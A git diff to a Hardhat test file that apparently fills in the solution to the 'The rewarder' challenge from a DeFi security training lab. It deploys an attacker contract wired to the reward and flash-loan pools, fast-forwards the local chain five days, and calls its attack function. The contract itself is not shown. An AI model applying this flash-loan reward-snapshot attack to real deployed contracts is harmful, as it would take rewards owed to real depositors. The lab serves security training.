@@ -1,4 +1,4 @@
-const { ethers } = require('hardhat');
+const { ethers, provider } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] The rewarder', function () {
@@ -29,6 +29,14 @@ describe('[Challenge] The rewarder', function () {
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
         this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+
+        const TheRewarderAttackerFactory = await ethers.getContractFactory('TheRewarderAttacker', attacker);
+        this.attackerContract = await TheRewarderAttackerFactory.connect(attacker).deploy(
+            this.rewarderPool.address, 
+            this.liquidityToken.address, 
+            this.flashLoanPool.address, 
+            this.rewardToken.address,
+        );
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
@@ -65,7 +73,17 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const lastRewardTimestamps = await this.rewarderPool.lastRecordedSnapshotTimestamp();
+
+        const FIVE_DAYS = 5 * 24 * 60 * 60;
+
+        const newRewardTimestamp = parseInt(lastRewardTimestamps, 10) + FIVE_DAYS;
+
+        await ethers.provider.send('evm_setNextBlockTimestamp', [newRewardTimestamp]); 
+        await ethers.provider.send('evm_mine');
+
+        let tx = await this.attackerContract.attack();
+        await tx.wait();
     });
 
     after(async function () {
